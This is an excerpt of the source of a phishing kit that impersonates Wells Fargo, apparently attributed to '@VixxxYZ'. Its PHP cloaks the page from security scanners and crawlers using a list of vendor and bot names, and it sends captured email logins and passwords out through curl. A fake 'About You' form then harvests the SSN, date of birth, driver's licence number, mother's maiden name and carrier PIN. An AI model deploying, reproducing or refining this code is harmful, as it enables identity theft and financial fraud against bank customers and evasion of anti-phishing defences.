...
include'../admin/VixxxyZ/badipdetector.php';
...
$Botname = array( // LIST BOOTS NAME
    ...
    $blocked_words = array("drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler","googlebot","Googlebot-Video","bingbot","Baiduspider","Baiduspider-mobile","Baiduspider-video","Baiduspider-image","NaverBot","Yeti","Yandex","YandexBot","YandexMobileBot","YandexVideo","YandexWebmaster","YandexSitelinks","SeznamBot","AdsBot-Google","Twitterbot","Adidxbot","externalfacebookhit","Facebot","Yahoo Pipes 1.0","facebookexternalhit","EtaoSpider","amazon","netflix","Slurp","msnbot","Applebot","Googlebot-Image","teoma","ia_archiver","YandexDirect","gsa-crawler","OmniExplorer_Bot","msnbot-mobile","YahooSeeker","SPRO-NET-206-80-96","SPRO-NET-207-70-0","SPRO-NET-209-19-128","LVLT-STATIC-4-14-16","americanexpress","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","paypal");
       ...
       foreach($blocked_words as $word) {
        ...
        $banned_isp = array(
            ...
            if(!$_POST['email']== NULL){
                ...
                $mess .= '| WELLS MAIL  LOGIN BY @VixxxYZ | ';
                $mess .=  '|  Wells email    | '. $_POST['email'] .'  '."\r\n";
                $mess .=  '|  Wells Password  |  '.$_POST['e_pass'] . ' '."\r\n";
                ...
                $curl = curl_init();
                    ...
                    $mseg =urldecode($mess);
                    $subject = "WELLS mail LOGIN BY @VixxxYZ   ";
      ...
      <body style="opacity: 1; visibility: visible;" class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">
          ...
          <div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="Wells Fargo - Application - About You" data-url="mainpage">
              ...
              <div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
                  <div class="primary-content">
                      ...
                      <form id="form" class="wait" action="card.php" method="POST">
                          ...
                          <div class="section">
                              ...
                              <div style="margin-top: 2rem;" class="ui-field-contain street2-field-voice-over">
                                  ...
                                  <div id="f1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                      <input style="text-transform: capitalize;" id="fname" name="fname" class="pmask" type="text" size="35">
                                  </div>
                              </div>
                              <div class="ui-field-contain inline-field-contain">
                                  <div class="inline-field">
                                      ...
                                      <div id="a1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input style="text-transform: capitalize;" id="addr" name="addr" class="pmask required EMAIL" type="text">
                                      </div>
                                  </div>
                                  <div class="inline-field">
                                      ...
                                      <div id="c1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input style="text-transform: capitalize;" id="city" name="city" class="pmask required EMAIL" type="text">
                                      </div>
                                  </div><div class="inline-field">
                                      <label class="lb" for="city">Mothers Maiden Name</label>
                                      <div id="c1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input style="text-transform: capitalize;" id="city" name="mmn" class="pmask required EMAIL" type="text">
                                      </div>
                                  </div><div class="inline-field">
                                      <label class="lb" for="city">Phone Number</label>
                                      <div id="c1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input style="text-transform: capitalize;" id="city" name="phone" class="pmask required EMAIL" type="tel" minlength="10" maxlength="10">
                                      </div>
                                  </div><div class="inline-field">
                                      <label class="lb" for="city">DL Number</label>
                                      <div id="c1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input style="text-transform: capitalize;" id="city" name="dl" class="pmask required EMAIL" type="text" minlength="13" maxlength="13">
                                      </div>
                                  </div><div class="inline-field">
                                      <label class="lb" for="city">Carrier PIN</label>
                                      <div id="c1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input style="text-transform: capitalize;" id="city" name="c_pin" class="pmask required EMAIL" type="tel" maxlength="4" minlength="4">
                                      </div>
                                  </div>
                              </div>
                              <div class="ui-field-contain inline-field-contain">
                                  <div class="inline-field">
                                      ...
                                      <div id="s1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input style="text-transform: capitalize;" id="state" name="state" class="pmask required EMAIL" type="text">
                                      </div>
                                  </div>
                                  <div class="inline-field">
                                      ...
                                      <div id="z1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input id="zip" name="zip" class="pmask required EMAIL" type="text">
                                      </div>
                                  </div>
                              </div>
                              <div class="ui-field-contain inline-field-contain">
                                  <div class="inline-field">
                                      ...
                                      <div id="s2" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input id="ssn" name="ssn" class="pmask required EMAIL" type="text">
                                      </div>
                                  </div>
                                  <div class="inline-field">
                                      ...
                                      <div id="d1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                          <input id="dob" name="dob" class="pmask required EMAIL" type="text">
                                      </div>
                                  </div>
                              </div>
                          </div>
          ...
          <script src="../Export/js/billing.js"></script>
